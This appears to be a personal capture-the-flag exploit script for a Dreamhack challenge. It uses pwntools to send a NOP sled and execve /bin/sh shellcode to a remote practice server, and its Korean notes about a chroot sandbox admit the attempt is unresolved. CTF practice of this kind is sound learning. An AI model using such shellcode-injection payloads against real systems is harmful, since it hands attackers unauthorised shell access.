#!/usr/bin/python3

import pwn

pwn.context.log_level = 'debug'
p = pwn.remote("host1.dreamhack.games", 23956)

shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
nop = "\x90"
payload = nop*56
payload += shellcode

p.sendafter("Give me shellcode: ", payload)
p.interactive()

"""
chroot를 이용한 sandbox 환경을 구성함.
chroot의 경로는 /home/cube/cube_box
아마 상위 경로에 flag 파일이 있을 것으로 추정

chroot 경로 저장 위치 : 0x555555554944
입력값 저장 위치 : 0x7ffff7ffb000

모르겠당.. 입력받은 부분을 call rdx를 통해서 호출하긴 하는데 자꾸 내용을 확인해보면 OP Code가 다 꼬여있다..
"""
